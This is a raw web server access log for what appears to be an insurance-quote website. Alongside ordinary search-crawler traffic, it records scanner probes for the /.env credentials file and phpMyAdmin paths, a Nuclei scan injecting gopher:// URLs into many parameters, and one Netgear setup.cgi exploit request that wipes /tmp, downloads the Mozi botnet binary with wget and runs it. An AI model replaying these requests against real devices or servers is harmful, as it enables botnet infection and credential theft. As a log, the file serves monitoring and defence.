::ffff:162.142.125.128 - - [03/Feb/2021:00:50:46 +0000] "GET / HTTP/1.1" 200 68937 "-" "-"
::ffff:127.0.0.1 - - [03/Feb/2021:00:59:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Go-http-client/1.1"
::ffff:127.0.0.1 - - [03/Feb/2021:01:01:30 +0000] "GET /get_life_nsurance HTTP/1.1" 200 60792 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:209.17.97.114 - - [03/Feb/2021:01:10:52 +0000] "GET / HTTP/1.0" 200 68937 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:209.17.96.82 - - [03/Feb/2021:01:21:26 +0000] "GET / HTTP/1.1" 200 68937 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [03/Feb/2021:01:26:32 +0000] "GET / HTTP/1.1" 200 68937 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.140 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [03/Feb/2021:01:28:23 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 148 "-" "-"
::ffff:127.0.0.1 - - [03/Feb/2021:01:54:26 +0000] "GET / HTTP/1.1" 200 68937 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
::ffff:127.0.0.1 - - [03/Feb/2021:01:54:26 +0000] "GET /web_assets/assets/img/favicon.png HTTP/1.1" 200 477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
::ffff:127.0.0.1 - - [03/Feb/2021:01:56:01 +0000] "GET / HTTP/1.1" 200 68937 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [03/Feb/2021:02:07:08 +0000] "GET / HTTP/1.1" 200 68937 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:84.0) Gecko/20100101 Firefox/84.0"
::ffff:127.0.0.1 - - [03/Feb/2021:02:27:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:27:25 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:28:46 +0000] "GET /?cat=gopher://gopherp1.swiftbullhead.com.01h4x.com&dir=gopher://gopherp2.swiftbullhead.com.01h4x.com&action=gopher://gopherp3.swiftbullhead.com.01h4x.com&board=gopher://gopherp4.swiftbullhead.com.01h4x.com&date=gopher://gopherp5.swiftbullhead.com.01h4x.com&detail=gopher://gopherp6.swiftbullhead.com.01h4x.com&file=gopher://gopherp7.swiftbullhead.com.01h4x.com&download=gopher://gopherp8.swiftbullhead.com.01h4x.com&path=gopher://gopherp9.swiftbullhead.com.01h4x.com&folder=gopher://gopherp10.swiftbullhead.com.01h4x.com&prefix=gopher://gopherp11.swiftbullhead.com.01h4x.com&include=gopher://gopherp12.swiftbullhead.com.01h4x.com&page=gopher://gopherp13.swiftbullhead.com.01h4x.com&inc=gopher://gopherp14.swiftbullhead.com.01h4x.com&locate=gopher://gopherp15.swiftbullhead.com.01h4x.com&show=gopher://gopherp16.swiftbullhead.com.01h4x.com&doc=gopher://gopherp17.swiftbullhead.com.01h4x.com&site=gopher://gopherp18.swiftbullhead.com.01h4x.com&type=gopher://gopherp19.swiftbullhead.com.01h4x.com&view=gopher://gopherp20.swiftbullhead.com.01h4x.com&content=gopher://gopherp21.swiftbullhead.com.01h4x.com&document=gopher://gopherp22.swiftbullhead.com.01h4x.com&layout=gopher://gopherp23.swiftbullhead.com.01h4x.com&mod=gopher://gopherp24.swiftbullhead.com.01h4x.com&conf=gopher://gopherp25.swiftbullhead.com.01h4x.com HTTP/1.1" 200 68937 "-" "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:53 +0000] "GET /phpminiadmin.php HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:53 +0000] "GET /miniadmin.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:53 +0000] "GET /phpminiadmin/phpminiadmin.php HTTP/1.1" 404 168 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:53 +0000] "GET /mini.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:54 +0000] "GET /pma.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:54 +0000] "GET /mysql.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:54 +0000] "GET /sql.php HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:53:54 +0000] "GET /phpmyadmin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:02:58:45 +0000] "GET /get_worker_comp_nsurance HTTP/1.1" 200 58135 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:127.0.0.1 - - [03/Feb/2021:03:07:25 +0000] "GET /blog-details/18 HTTP/1.1" 200 40051 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.140 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [03/Feb/2021:03:38:23 +0000] "GET / HTTP/1.1" 200 68937 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [03/Feb/2021:03:48:09 +0000] "GET /blog-details/7 HTTP/1.1" 200 40359 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:127.0.0.1 - - [03/Feb/2021:03:57:01 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:03:57:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [03/Feb/2021:03:58:29 +0000] "GET / HTTP/1.1" 200 68937 "-" "Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0"
